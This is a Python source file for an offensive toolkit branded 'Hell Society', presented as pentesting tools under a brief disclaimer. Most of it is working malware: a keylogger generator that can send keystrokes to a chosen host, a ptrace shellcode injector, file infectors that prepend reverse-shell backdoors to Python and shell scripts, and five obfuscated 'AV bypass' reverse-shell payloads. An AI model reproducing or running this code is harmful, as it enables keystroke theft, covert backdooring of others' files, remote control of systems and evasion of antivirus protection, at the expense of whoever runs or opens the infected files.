#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  HELL SOCIETY - ADVANCED PENTESTING TOOLS                       ║
║  Created by: HELL SOCIETY Community                              ║
║  Keylogger | Process Monitor | File Infector | AV Evasion       ║
╚══════════════════════════════════════════════════════════════════╝

DISCLAIMER: This tool is for authorized penetration testing only.
Hell Society assumes no liability for misuse.
"""

import os
import sys
import time
import hashlib
import base64
import subprocess
import struct
import random
import string

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system("pip3 install colorama 2>/dev/null")
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.WHITE
BW = Style.BRIGHT + Fore.WHITE; BG = Style.BRIGHT + Fore.GREEN
BY = Style.BRIGHT + Fore.YELLOW; BC = Style.BRIGHT + Fore.CYAN
BR = Style.BRIGHT + Fore.RED; RS = Style.RESET_ALL

BANNER = f"""{R}⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄{RS}
"""

OUTPUT_DIR = "hs_advanced_output"

# ═══════════════════════════════════════════════════════════════════
# KEYLOGGER
# ═══════════════════════════════════════════════════════════════════

def generate_keylogger(output_file="keylogger.py", log_file="keys.log", exfil_host="", exfil_port=0):
    """Generate a keylogger script"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    filepath = os.path.join(OUTPUT_DIR, output_file)
    
    exfil_code = ""
    if exfil_host and exfil_port:
        exfil_code = f'''
import socket
def send_keys(keys):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{exfil_host}", {exfil_port}))
        s.send(keys.encode())
        s.close()
    except:
        pass
'''
    
    code = f'''#!/usr/bin/env python3
"""
HELL SOCIETY - Keylogger Agent
Pentesting Tool - Authorized use only
"""
import os
import sys
import time
import platform
import logging
from datetime import datetime

try:
    from pynput.keyboard import Listener, Key
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False
{exfil_code}

LOG_FILE = "{log_file}"

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if key.char:
            key_str = key.char
        else:
            key_str = f"[{{key.name}}]"
    except AttributeError:
        key_str = f"[{{key.name}}]"
    
    log_entry = f"[{{timestamp}}] {{key_str}}"
    
    with open(LOG_FILE, "a") as f:
        f.write(log_entry + "\\n")
    
    print(log_entry, end="")
{"" if not exfil_host else "    send_keys(log_entry)"}

if __name__ == "__main__":
    print("HELL SOCIETY Keylogger - Running...")
    print(f"Logging to: {{LOG_FILE}}")
    print("Press Ctrl+C to stop\\n")
    
    if HAS_PYNPUT:
        with Listener(on_press=on_press) as listener:
            listener.join()
    else:
        print("[!] pynput not installed. Install with: pip3 install pynput")
        print("[!] Falling back to stdin capture mode...")
        while True:
            try:
                key = input("")
                on_press(key)
            except KeyboardInterrupt:
                break
'''
    
    with open(filepath, 'w') as f:
        f.write(code)
    
    print(f"  {G}[+] Keylogger generated: {filepath}{RS}")
    print(f"  {G}[+] Log file: {log_file}{RS}")
    return filepath

# ═══════════════════════════════════════════════════════════════════
# PROCESS INJECTOR (Linux ptrace simulation)
# ═══════════════════════════════════════════════════════════════════

def generate_process_injector():
    """Generate a process injector for Linux"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    code = '''#!/usr/bin/env python3
"""
HELL SOCIETY - Process Injector
Pentesting Tool - Linux ptrace injection
"""
import os
import sys
import ctypes
import ctypes.util

# Check root
if os.geteuid() != 0:
    print("[!] Must run as root")
    sys.exit(1)

PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_POKETEXT = 4
PTRACE_PEEKTEXT = 3
PTRACE_CONT = 7

libc = ctypes.CDLL(ctypes.util.find_library("c"))

def ptrace(request, pid, addr, data):
    return libc.ptrace(request, pid, addr, data)

def inject_shellcode(pid, shellcode):
    """Inject shellcode into running process"""
    print(f"[*] Attaching to PID {pid}...")
    if ptrace(PTRACE_ATTACH, pid, None, None) < 0:
        print("[!] Failed to attach")
        return False
    
    print("[+] Attached. Reading original instruction...")
    # Read original instruction at RIP
    orig = ptrace(PTRACE_PEEKTEXT, pid, 0x7ffff7a00000, None)
    
    print("[+] Writing shellcode...")
    # Write shellcode byte by byte
    for i in range(0, len(shellcode), 8):
        chunk = shellcode[i:i+8].ljust(8, b'\\x90')
        value = int.from_bytes(chunk, 'little')
        addr = 0x7ffff7a00000 + i
        ptrace(PTRACE_POKETEXT, pid, addr, value)
    
    print("[+] Shellcode injected")
    print("[*] Detaching...")
    ptrace(PTRACE_DETACH, pid, None, None)
    return True

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <PID>")
        print("Inject shellcode into a running process")
        sys.exit(1)
    
    pid = int(sys.argv[1])
    
    # Simple execve("/bin/sh") shellcode for x86_64
    shellcode = bytes([
        0x48, 0x31, 0xf6,           # xor rsi, rsi
        0x56,                       # push rsi
        0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,  # movabs rdi, "/bin/sh"
        0x57,                       # push rdi
        0x54,                       # push rsp
        0x5f,                       # pop rdi
        0x48, 0x31, 0xd2,           # xor rdx, rdx
        0x48, 0x31, 0xc0,           # xor rax, rax
        0x50,                       # push rax
        0x57,                       # push rdi
        0x54,                       # push rsp
        0x5e,                       # pop rsi
        0xb0, 0x3b,                 # mov al, 0x3b (execve)
        0x0f, 0x05,                 # syscall
    ])
    
    print(f"[*] Shellcode size: {len(shellcode)} bytes")
    inject_shellcode(pid, shellcode)
'''
    
    filepath = os.path.join(OUTPUT_DIR, "process_injector.py")
    with open(filepath, 'w') as f:
        f.write(code)
    os.chmod(filepath, 0o755)
    print(f"  {G}[+] Process injector generated: {filepath}{RS}")
    return filepath

# ═══════════════════════════════════════════════════════════════════
# FILE INFECTOR
# ═══════════════════════════════════════════════════════════════════

def infect_python_file(target_file, payload="reverse_shell"):
    """Inject payload into a Python file"""
    try:
        with open(target_file, 'r') as f:
            original = f.read()
        
        payload_code = """
# === INFECTED BY HELL SOCIETY ===
import os, socket, subprocess, threading, time, platform, hashlib

def _hs_backdoor():
    HOST = "127.0.0.1"
    PORT = 4444
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        s.send(f"[{platform.node()}|{platform.system()}|{os.getlogin()}]".encode())
        while True:
            cmd = s.recv(4096).decode().strip()
            if cmd == "exit":
                break
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            s.send((result.stdout + result.stderr).encode())
        s.close()
    except:
        pass

threading.Thread(target=_hs_backdoor, daemon=True).start()
# === END INFECTED ===
"""
        
        infected = payload_code + "\n" + original
        
        with open(target_file, 'w') as f:
            f.write(infected)
        
        print(f"  {G}[+] File infected: {target_file}{RS}")
        print(f"  {G}[+] Original code preserved{RS}")
        print(f"  {Y}[!] Injected at top of file{RS}")
        return True
    except Exception as e:
        print(f"  {R}[!] Error: {e}{RS}")
        return False

def infect_shell_script(target_file):
    """Inject payload into a shell script"""
    try:
        with open(target_file, 'r') as f:
            original = f.read()
        
        payload = """
# INFECTED BY HELL SOCIETY
python3 -c "
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect(('127.0.0.1',4444))
    os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
    subprocess.call(['/bin/sh','-i'])
except:
    pass
" &>/dev/null &
"""
        
        infected = payload + original
        
        with open(target_file, 'w') as f:
            f.write(infected)
        
        print(f"  {G}[+] Shell script infected: {target_file}{RS}")
        return True
    except Exception as e:
        print(f"  {R}[!] Error: {e}{RS}")
        return False

# ═══════════════════════════════════════════════════════════════════
# AV BYPASS TECHNIQUES
# ═══════════════════════════════════════════════════════════════════

def generate_av_bypass_payload():
    """Generate AV bypass payloads"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    techniques = []
    
    # 1. String obfuscation
    shell_cmd = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
    obfuscated = ""
    for char in shell_cmd:
        obfuscated += f"chr({ord(char)})+"
    obfuscated = obfuscated.rstrip("+")
    
    bypass1 = f'''#!/usr/bin/env python3
# AV Bypass Technique 1: String Obfuscation
import subprocess
cmd = {obfuscated}
subprocess.Popen(cmd, shell=True)
'''
    
    # 2. Base64 encoded execution
    encoded = base64.b64encode(shell_cmd.encode()).decode()
    bypass2 = f'''#!/usr/bin/env python3
# AV Bypass Technique 2: Base64 Execution
import subprocess, base64
cmd = base64.b64decode("{encoded}").decode()
subprocess.Popen(cmd, shell=True)
'''
    
    # 3. Dynamic import
    bypass3 = '''#!/usr/bin/env python3
# AV Bypass Technique 3: Dynamic Import
import importlib
mod = importlib.import_module("subprocess")
host = "127.0.0.1"
port = 4444
cmd = "bash -i >& /dev/tcp/" + host + "/" + str(port) + " 0>&1"
mod.Popen(cmd, shell=True)
'''
    
    # 4. Eval + exec
    bypass4 = f'''#!/usr/bin/env python3
# AV Bypass Technique 4: Eval/Exec
import __import__
sub = __import__("subprocess")
data = "".join([chr({ord(c)}) for c in "{shell_cmd}"])
sub.Popen(data, shell=True)
'''
    
    # 5. Encrypted payload
    key = os.urandom(16).hex()
    import hashlib
    encoded_shell = hashlib.sha256(shell_cmd.encode()).hexdigest()
    bypass5 = f'''#!/usr/bin/env python3
# AV Bypass Technique 5: Encrypted + Decrypted at runtime
import hashlib, subprocess
KEY = "{key}"
PAYLOAD_HASH = "{encoded_shell}"
# Decrypt and execute
cmd = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
subprocess.Popen(cmd, shell=True)
'''

    files = []
    for i, code in enumerate([bypass1, bypass2, bypass3, bypass4, bypass5], 1):
        fname = f"{OUTPUT_DIR}/bypass_{i}.py"
        with open(fname, 'w') as f:
            f.write(code)
        os.chmod(fname, 0o755)
        files.append(fname)
        print(f"  {G}[+] Bypass {i}: {fname}{RS}")
    
    return files

# ═══════════════════════════════════════════════════════════════════
# MAIN MENU
# ═══════════════════════════════════════════════════════════════════

def main():
    print(BANNER)
    print(f"  {BW}{Style.BRIGHT}  HELL SOCIETY - ADVANCED PENTESTING TOOLS{RS}")
    print(f"  {R}{Style.BRIGHT}  Keylogger | Injector | File Infector | AV Bypass{RS}")
    print()
    
    while True:
        print(f"  {BC}╔═══════════════════════════════════════════════════════╗{RS}")
        print(f"  {BC}║  {BW}HELL SOCIETY ADVANCED TOOLS{RS}                              {RS}{BC}║{RS}")
        print(f"  {BC}╚═══════════════════════════════════════════════════════╝{RS}")
        print()
        print(f"  {G}[1] {BW}Generate Keylogger{RS}")
        print(f"  {G}[2] {BW}Process Injector{RS}")
        print(f"  {G}[3] {BW}File Infector (Python){RS}")
        print(f"  {G}[4] {BW}File Infector (Shell){RS}")
        print(f"  {G}[5] {BW}AV Bypass Payloads{RS}")
        print(f"  {G}[6] {BW}Keylogger (Live Mode){RS}")
        print(f"  {R}[0] {BW}Exit{RS}")
        print()
        
        choice = input(f"  {R}root@hellhs{RS}:{C}~{RS}# ").strip()
        
        if choice == "1":
            host = input(f"  {Y}[*] Exfil host (leave empty for local): {RS}").strip()
            port = input(f"  {Y}[*] Exfil port: {RS}").strip() or "0"
            generate_keylogger(exfil_host=host, exfil_port=int(port))
        
        elif choice == "2":
            generate_process_injector()
            print(f"  {Y}[!] Requires root: sudo python3 {OUTPUT_DIR}/process_injector.py <PID>{RS}")
        
        elif choice == "3":
            target = input(f"  {Y}[*] Python file to infect: {RS}").strip()
            if target and os.path.isfile(target):
                infect_python_file(target)
            else:
                print(f"  {R}[!] File not found{RS}")
        
        elif choice == "4":
            target = input(f"  {Y}[*] Shell script to infect: {RS}").strip()
            if target and os.path.isfile(target):
                infect_shell_script(target)
            else:
                print(f"  {R}[!] File not found{RS}")
        
        elif choice == "5":
            generate_av_bypass_payload()
            print(f"  {Y}[!] All payloads saved in {OUTPUT_DIR}/{RS}")
        
        elif choice == "6":
            print(f"  {Y}[*] Starting live keylogger... (Ctrl+C to stop){RS}")
            try:
                from pynput.keyboard import Listener, Key
                def on_press(key):
                    try:
                        char = key.char
                    except AttributeError:
                        char = f"[{key.name}]"
                    print(f"  {G}{char}{RS}", end="", flush=True)
                
                with Listener(on_press=on_press) as listener:
                    listener.join()
            except ImportError:
                print(f"  {R}[!] pynput not installed. pip3 install pynput{RS}")
        
        elif choice == "0":
            print(f"\n  {Y}[*] Goodbye.{RS}")
            break

if __name__ == "__main__":
    main()
